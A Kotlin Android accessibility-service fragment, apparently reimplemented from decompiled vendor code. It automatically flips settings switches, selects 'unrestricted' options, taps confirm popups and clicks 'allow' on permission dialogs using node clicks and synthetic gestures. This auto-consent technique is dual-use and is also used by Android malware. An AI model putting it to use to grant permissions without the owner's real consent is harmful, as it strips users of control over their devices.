                Log.i(TAG, "[findTextAndClickSwitch] text='$text' nodeText='$nodeText' switchClass='$switchClass' isChecked=$switchChecked")

                if (!switchChecked) {
                    val clicked = clickNodeWithFallback(switchNode)
                    if (clicked) {
                        Log.i(TAG, "[findTextAndClickSwitch] ✅ switch ENABLED for: $text")
                        return true
                    }
                } else {
                    Log.i(TAG, "[findTextAndClickSwitch] ✅ switch already ON for: $text, skipping")
                    return true
                }
            }
            // No fallback text click — clicking text node directly could toggle the switch off
        }
        return false
    }

    /**
     * Find Switch/CheckBox/Toggle near a text node.
     * Vendor m212264c6: walks up to parent, searches siblings up to 3 levels deep.
     * Also checks if switch is to the right of the text (vendor a9 pattern).
     */
    internal fun findSwitchNearNode(textNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val textRect = Rect()
        textNode.getBoundsInScreen(textRect)

        val parent = try { textNode.parent } catch (_: Exception) { null } ?: return null
        // Level 1: parent's direct children
        for (i in 0 until parent.childCount) {
            val child = try { parent.getChild(i) } catch (_: Exception) { null } ?: continue
            if (isSwitchNode(child)) {
                Log.d(TAG, "[findSwitchNearNode] L1 found: ${child.className}")
                return child
            }
            // Level 2: grandchildren
            for (j in 0 until child.childCount) {
                val grandchild = try { child.getChild(j) } catch (_: Exception) { null } ?: continue
                if (isSwitchNode(grandchild)) {
                    Log.d(TAG, "[findSwitchNearNode] L2 found: ${grandchild.className}")
                    return grandchild
                }
                // Level 3
                for (k in 0 until grandchild.childCount) {
                    val great = try { grandchild.getChild(k) } catch (_: Exception) { null } ?: continue
                    if (isSwitchNode(great)) {
                        Log.d(TAG, "[findSwitchNearNode] L3 found: ${great.className}")
                        return great
                    }
                }
            }
        }

        // Walk up one more level (vendor c8 pattern: parent.parent)
        val grandparent = try { parent.parent } catch (_: Exception) { null }
        if (grandparent != null) {
            for (i in 0 until grandparent.childCount) {
                val uncle = try { grandparent.getChild(i) } catch (_: Exception) { null } ?: continue
                if (isSwitchNode(uncle)) return uncle
                for (j in 0 until uncle.childCount) {
                    val cousin = try { uncle.getChild(j) } catch (_: Exception) { null } ?: continue
                    if (isSwitchNode(cousin)) return cousin
                }
            }
        }
        return null
    }

    /**
     * Check if a node is a Switch/CheckBox/Toggle widget.
     * Vendor m212244c7: checks className against known switch types, must be visible and enabled.
     */
    private fun isSwitchNode(node: AccessibilityNodeInfo): Boolean {
        if (!node.isVisibleToUser || !node.isEnabled) return false
        val className = node.className?.toString() ?: return false
        // If node is checkable, it's a switch-like widget
        if (node.isCheckable) return true
        // Otherwise check class name against known types
        return SWITCH_CLASS_NAMES.any { className.contains(it, ignoreCase = true) }
    }

    /**
     * Click a node with parent-walk and gesture fallback.
     * Vendor m212288f3 (clickTextNode) + m212289f4 (clickConfirmNode).
     */
    internal fun clickNodeWithFallback(node: AccessibilityNodeInfo): Boolean {
        try {
            // Direct click
            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true

            // Gesture tap at node center (vendor f3 pattern)
            val rect = Rect()
            node.getBoundsInScreen(rect)
            val cx = rect.centerX().toFloat()
            val cy = rect.centerY().toFloat()
            val screenW = context.resources.displayMetrics.widthPixels
            val screenH = context.resources.displayMetrics.heightPixels
            if (cx > 0f && cy > 0f && cx < screenW && cy < screenH && rect.width() > 0 && rect.height() > 0) {
                if (gestureTap(cx, cy)) return true
            }

            // Walk up parents (vendor f4 pattern: 3 levels)
            var parent = node.parent
            for (depth in 0 until 3) {
                if (parent == null) break
                if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                val gp = parent.parent
                parent = gp
            }
        } catch (_: Exception) {}
        return false
    }

    /**
     * Find and click text directly (for radio buttons like "无限制").
     * Vendor m212248a1 (clickTextDirectly).
     */
    internal suspend fun findAndClickText(keywords: List<String>): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        for (keyword in keywords) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                val nodeText = node.text?.toString()?.trim() ?: ""
                if (nodeText == keyword || nodeText.contains(keyword, ignoreCase = true)) {
                    if (clickNodeWithFallback(node)) {
                        Log.i(TAG, "[findAndClickText] clicked: $keyword")
                        return true
                    }
                }
            }
        }

        // Scroll and retry
        for (attempt in 0 until MAX_SCROLL_ATTEMPTS) {
            if (!scrollDown(root)) break
            interruptibleDelay(500L)
            val newRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: break
            for (keyword in keywords) {
                val nodes = try { newRoot.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        val nodeText = node.text?.toString()?.trim() ?: ""
                        if (nodeText == keyword || nodeText.contains(keyword, ignoreCase = true)) {
                            if (clickNodeWithFallback(node)) return true
                        }
                    }
                }
            }
        }
        return false
    }

    /**
     * Handle confirm popup dialog after toggling a switch.
     * Vendor m212283e8 (handleConfirmPopupDialog): searches for confirm keywords and clicks.
     */
    internal suspend fun handleConfirmPopupDialog(): Boolean {
        interruptibleDelay(500L)
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        for (keyword in CONFIRM_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (node.isVisibleToUser && node.isClickable) {
                    if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i(TAG, "[handleConfirmPopup] clicked: $keyword")
                        return true
                    }
                }
            }
        }
        return false
    }

    /**
     * Return to home screen. Vendor m212280e5 (returnToHome): 3×BACK + 1×HOME + delay.
     * BACK clears any nested settings pages before going HOME.
     */
    /**
     * Return to home screen. Vendor m212280e5: 3x BACK + 1x HOME + delay(1000ms).
     * BACK first to close settings page stack, then HOME to go to launcher.
     */
    internal suspend fun returnToHome() {
        try {
            repeat(3) {
                service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
                interruptibleDelay(200L)
            }
            service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
            interruptibleDelay(1000L)
        } catch (_: Exception) {}
    }

    /**
     * Scroll down in the current view. Vendor m212279e4 (scrollDown via ACTION_SCROLL_FORWARD)
     * with gesture fallback m212278e3.
     */
    private fun scrollDown(root: AccessibilityNodeInfo): Boolean {
        // Try finding a scrollable node first
        val scrollable = findScrollableNode(root)
        if (scrollable != null) {
            val result = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
            if (result) return true
        }
        // Gesture fallback: swipe up from center
        val w = context.resources.displayMetrics.widthPixels
        val h = context.resources.displayMetrics.heightPixels
        return gestureSwipe(w / 2f, h * 0.7f, w / 2f, h * 0.3f)
    }

    /** Find first scrollable node in tree. Vendor m212243c5. */
    private fun findScrollableNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isScrollable) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            if (child.isScrollable) return child
            val found = findScrollableNode(child)
            if (found != null) {
                child.recycle()
                return found
            }
            child.recycle()
        }
        return null
    }

    /** Gesture tap at coordinates. Vendor m212277e2. */
    private fun gestureTap(x: Float, y: Float): Boolean {
        return try {
            val path = Path().apply { moveTo(x, y) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 10L, 50L))
                .build()
            service?.dispatchGesture(gesture, null, null)
            Thread.sleep(100L)
            true
        } catch (_: Exception) { false }
    }

    /** Gesture swipe. Vendor m212278e3. */
    private fun gestureSwipe(x1: Float, y1: Float, x2: Float, y2: Float): Boolean {
        return try {
            val path = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 10L, 300L))
                .build()
            service?.dispatchGesture(gesture, null, null)
            Thread.sleep(500L)
            true
        } catch (_: Exception) { false }
    }

    /** Get app display label. Vendor m212267d1. */
    private fun getAppLabel(): String {
        return try {
            val pm = context.packageManager
            val appInfo = pm.getApplicationInfo(context.packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) { "" }
    }

    /**
     * Phase 0 self-polling: search for permission allow keywords and click.
     * Replaces handler dependency. Vendor f55110a4 keyword list.
     * Returns true if a click was performed.
     */
    internal fun pollClickPermissionAllow(root: AccessibilityNodeInfo): Boolean {
        for (keyword in PERMISSION_ALLOW_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                val nodeText = node.text?.toString()?.trim() ?: ""
                if (nodeText != keyword && !nodeText.contains(keyword, ignoreCase = true)) continue
                // Prefer direct click on clickable node
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "[Phase0] clicked allow: $keyword")
                    return true
                }
                // Walk up parents (3 levels)
                var parent = try { node.parent } catch (_: Exception) { null }
                for (depth in 0 until 3) {
                    if (parent == null) break
                    if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i(TAG, "[Phase0] clicked parent for: $keyword")
                        return true
                    }
                    parent = try { parent.parent } catch (_: Exception) { null }
                }
                // Gesture fallback
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (rect.width() > 0 && rect.height() > 0) {
                    if (gestureTap(rect.centerX().toFloat(), rect.centerY().toFloat())) {
                        Log.i(TAG, "[Phase0] gesture tap for: $keyword")
                        return true
                    }
                }
            }
        }
        return false
    }

    /** Count total nodes in accessibility tree. Matches vendor m212239a7. */
    private fun countNodes(node: android.view.accessibility.AccessibilityNodeInfo): Int {
        var count = 1
        try {
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                count += countNodes(child)
                try { child.recycle() } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return count
    }
}
